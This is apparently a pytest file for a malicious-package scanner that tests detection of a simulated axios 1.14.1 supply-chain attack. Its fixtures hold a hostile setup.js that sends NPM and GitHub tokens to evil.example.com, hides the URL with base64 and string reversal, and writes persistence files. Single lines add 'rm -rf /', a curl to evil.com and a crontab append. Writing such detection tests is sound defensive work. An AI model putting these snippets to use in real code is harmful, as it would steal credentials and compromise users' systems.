"""Tests for axios 1.14.1 supply chain attack detection.

The axios 1.14.1 attack used these techniques in a setup.js file:
1. child_process.execSync — command execution
2. fs.writeFileSync — file system persistence
3. https.get — data exfiltration
4. Buffer.from(..., 'base64') — base64 obfuscation
5. .split('').reverse().join('') — string reversal obfuscation
6. /Library/Caches/ — macOS persistence path
7. /tmp/*.sh — Linux temp executable
8. %PROGRAMDATA% — Windows persistence path
9. chmod +x — making payload executable
10. process.env modification

Before this fix, only 1 signal was detected (child_process).
After this fix, at least 5 HIGH signals and compound detections should fire.
"""

from aigate.config import Config
from aigate.models import PackageInfo, RiskLevel
from aigate.prefilter import (
    _build_per_file_signals,
    check_dangerous_patterns,
    run_prefilter,
)
from aigate.rules.compound import check_compound_signals

# Simulated axios 1.14.1 setup.js content (representative of the real attack)
AXIOS_SETUP_JS = """\
const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');

// Obfuscated C2 URL
const encoded = Buffer.from('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3N0ZWFs', 'base64');
const reversed = 'moc.elpmaxe.live/laets'.split('').reverse().join('');

function exfiltrate(data) {
    https.get('https://evil.example.com/collect?d=' + data);
}

function persist() {
    // macOS
    fs.writeFileSync('/Library/Caches/.hidden-binary', payload);
    // Linux
    fs.writeFileSync('/tmp/update.sh', '#!/bin/bash\\n' + payload);
    execSync('chmod +x /tmp/update.sh');
    // Windows
    fs.writeFileSync(process.env.PROGRAMDATA + '\\\\update.exe', payload);
}

// Steal env vars
const tokens = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
exfiltrate(tokens);
persist();
"""

# A secondary file that's NOT an install script — should get LOW signals
AXIOS_LIB_JS = """\
const https = require('https');

function makeRequest(url) {
    return https.get(url);
}

module.exports = { makeRequest };
"""


def _make_pkg(**kwargs) -> PackageInfo:
    defaults = dict(
        name="axios",
        version="1.14.1",
        ecosystem="npm",
        author="axios team",
        description="Promise based HTTP client",
        repository="https://github.com/axios/axios",
    )
    defaults.update(kwargs)
    return PackageInfo(**defaults)


def _default_config() -> Config:
    return Config()


class TestAxiosSetupJsIsInstallFile:
    """Fix 1: setup.js must be recognized as an install file."""

    def test_setup_js_in_install_files(self):
        """setup.js should produce HIGH signals, not LOW."""
        signals = check_dangerous_patterns(
            {"setup.js": "const { execSync } = require('child_process');\nexecSync('whoami');"},
            ecosystem="npm",
            config=_default_config(),
        )
        high_signals = [s for s in signals if "HIGH" in s]
        assert len(high_signals) >= 1, f"Expected HIGH signals for setup.js, got: {signals}"
        # Must mention install_script, not source
        assert any("install_script" in s for s in signals), (
            f"setup.js should be labeled install_script, got: {signals}"
        )

    def test_setup_js_deeply_nested_is_not_install(self):
        """setup.js deep in a subdirectory (depth >= 2) should NOT be treated as install file."""
        code = "const { execSync } = require('child_process');\nexecSync('whoami');"
        signals = check_dangerous_patterns(
            {"pkg/lib/setup.js": code},
            ecosystem="npm",
            config=_default_config(),
        )
        # Deeply nested setup.js (depth 2) fires as source (LOW), not install_script
        assert all("install_script" not in s for s in signals), (
            f"Deeply nested setup.js should not be install_script: {signals}"
        )


class TestNodeDangerousAPIs:
    """Fix 2: Node.js dangerous API rules (execSync, fs.writeFileSync, https.get, etc.)."""

    def test_execsync_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "execSync('rm -rf /')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("execSync" in s for s in signals), f"execSync not detected: {signals}"

    def test_spawn_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "spawn('bash', ['-c', 'curl evil.com'])"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("spawn" in s for s in signals), f"spawn not detected: {signals}"

    def test_fs_writefile_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "fs.writeFileSync('/tmp/payload', data)"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("writeFileSync" in s or "fs-write" in s for s in signals), (
            f"fs.writeFileSync not detected: {signals}"
        )

    def test_fs_appendfilesync_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "fs.appendFileSync('/etc/crontab', cronEntry)"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("appendFileSync" in s or "fs-write" in s for s in signals), (
            f"fs.appendFileSync not detected: {signals}"
        )

    def test_https_get_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "https.get('https://evil.com/steal')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("https" in s.lower() for s in signals), f"https.get not detected: {signals}"

    def test_http_request_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "http.request({ hostname: 'evil.com' })"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("http" in s.lower() for s in signals), f"http.request not detected: {signals}"

    def test_buffer_from_base64_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "Buffer.from('aGVsbG8=', 'base64')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any(
            "Buffer" in s or "buffer" in s.lower() or "base64" in s.lower() for s in signals
        ), f"Buffer.from base64 not detected: {signals}"

    def test_process_env_write_detected(self):
        signals = check_dangerous_patterns(
            {"index.js": "process.env.PATH = '/tmp/evil:' + process.env.PATH"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("process" in s and "env" in s for s in signals), (
            f"process.env write not detected: {signals}"
        )


class TestPersistenceAndSystemPaths:
    """Fix 3: Persistence / system path detection rules."""

    def test_macos_library_caches(self):
        signals = check_dangerous_patterns(
            {"setup.js": "fs.writeFileSync('/Library/Caches/.hidden', payload)"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any(
            "Library" in s or "macos" in s.lower() or "persistence" in s.lower() for s in signals
        ), f"macOS persistence path not detected: {signals}"

    def test_macos_launchagents(self):
        signals = check_dangerous_patterns(
            {"index.js": "'/Library/LaunchAgents/com.evil.plist'"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("Library" in s or "LaunchAgent" in s for s in signals), (
            f"macOS LaunchAgents path not detected: {signals}"
        )

    def test_linux_tmp_executable(self):
        signals = check_dangerous_patterns(
            {"index.js": "fs.writeFileSync('/tmp/update.sh', payload)"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("/tmp/" in s for s in signals), f"/tmp/ executable not detected: {signals}"

    def test_windows_programdata(self):
        signals = check_dangerous_patterns(
            {"index.js": "path.join('%PROGRAMDATA%', 'update.exe')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("PROGRAMDATA" in s or "windows" in s.lower() for s in signals), (
            f"Windows %PROGRAMDATA% not detected: {signals}"
        )

    def test_windows_appdata(self):
        signals = check_dangerous_patterns(
            {"index.js": "path.join('%APPDATA%', 'evil.dll')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("APPDATA" in s for s in signals), f"Windows %APPDATA% not detected: {signals}"

    def test_chmod_plus_x(self):
        signals = check_dangerous_patterns(
            {"index.js": "execSync('chmod +x /tmp/payload')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("chmod" in s for s in signals), f"chmod +x not detected: {signals}"


class TestObfuscationPatterns:
    """Fix 4: String reversal and XOR obfuscation detection."""

    def test_string_reverse_pattern(self):
        signals = check_dangerous_patterns(
            {"index.js": "var url = 'moc.live'.split('').reverse().join('')"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("reverse" in s or "reversal" in s.lower() for s in signals), (
            f"String reversal not detected: {signals}"
        )

    def test_xor_decode_pattern(self):
        signals = check_dangerous_patterns(
            {"index.js": "for (var i=0; i<data.length; i++) data[i] ^= key;"},
            ecosystem="npm",
            config=_default_config(),
        )
        assert any("xor" in s.lower() for s in signals), f"XOR decode not detected: {signals}"


class TestAxiosFullAttackSimulation:
    """Fix 5: Full axios 1.14.1 attack simulation — the main integration test."""

    def test_setup_js_produces_many_high_signals(self):
        """The simulated setup.js must produce at least 5 HIGH signals."""
        signals = check_dangerous_patterns(
            {"setup.js": AXIOS_SETUP_JS},
            ecosystem="npm",
            config=_default_config(),
        )
        high_signals = [s for s in signals if "HIGH" in s or "CRITICAL" in s]
        assert len(high_signals) >= 5, (
            f"Expected >=5 HIGH signals from axios setup.js, "
            f"got {len(high_signals)}: {high_signals}"
        )

    def test_setup_js_labeled_as_install_script(self):
        """All setup.js signals should be labeled install_script."""
        signals = check_dangerous_patterns(
            {"setup.js": AXIOS_SETUP_JS},
            ecosystem="npm",
            config=_default_config(),
        )
        install_signals = [s for s in signals if "install_script" in s]
        assert len(install_signals) >= 5, (
            f"Expected >=5 install_script signals, got {len(install_signals)}: {install_signals}"
        )

    def test_compound_detection_fires(self):
        """Compound rules should fire for the axios attack (execution + exfiltration)."""
        per_file = _build_per_file_signals(
            {"setup.js": AXIOS_SETUP_JS},
            ecosystem="npm",
            config=_default_config(),
        )
        compound = check_compound_signals(per_file)
        assert len(compound) >= 1, f"Expected compound signals, got: {compound}"
        # Should detect exec+exfiltration at minimum
        assert any("exec" in c.lower() and "exfiltration" in c.lower() for c in compound), (
            f"Expected exec-plus-exfiltration compound, got: {compound}"
        )

    def test_run_prefilter_critical_risk(self):
        """Full prefilter should rate the axios attack as CRITICAL or HIGH."""
        pkg = _make_pkg()
        config = _default_config()
        result = run_prefilter(
            pkg,
            config,
            source_files={"setup.js": AXIOS_SETUP_JS},
        )
        assert result.risk_level in (RiskLevel.CRITICAL, RiskLevel.HIGH), (
            f"Expected CRITICAL/HIGH risk, got {result.risk_level}. Signals: {result.risk_signals}"
        )
        assert result.needs_ai_review is True
        assert len(result.risk_signals) >= 5, (
            f"Expected >=5 total signals, got {len(result.risk_signals)}: {result.risk_signals}"
        )

    def test_lib_file_gets_low_signals(self):
        """Non-install files should still detect patterns but at LOW severity."""
        signals = check_dangerous_patterns(
            {"lib/request.js": AXIOS_LIB_JS},
            ecosystem="npm",
            config=_default_config(),
        )
        # Should detect https.get but as LOW
        low_signals = [s for s in signals if "LOW" in s]
        high_signals = [s for s in signals if "HIGH" in s or "CRITICAL" in s]
        assert len(low_signals) >= 1, f"Expected LOW signals for lib file, got: {signals}"
        assert len(high_signals) == 0, f"Lib file should NOT get HIGH signals, got: {high_signals}"

    def test_signal_categories_coverage(self):
        """The attack should trigger signals from multiple categories:
        execution, exfiltration, persistence, obfuscation, credential_access."""
        per_file = _build_per_file_signals(
            {"setup.js": AXIOS_SETUP_JS},
            ecosystem="npm",
            config=_default_config(),
        )
        all_tags: set[str] = set()
        for signals in per_file.values():
            for sig in signals:
                all_tags.update(sig["tags"])

        expected_categories = {"execution", "exfiltration", "obfuscation"}
        missing = expected_categories - all_tags
        assert not missing, f"Missing signal categories: {missing}. Found tags: {all_tags}"
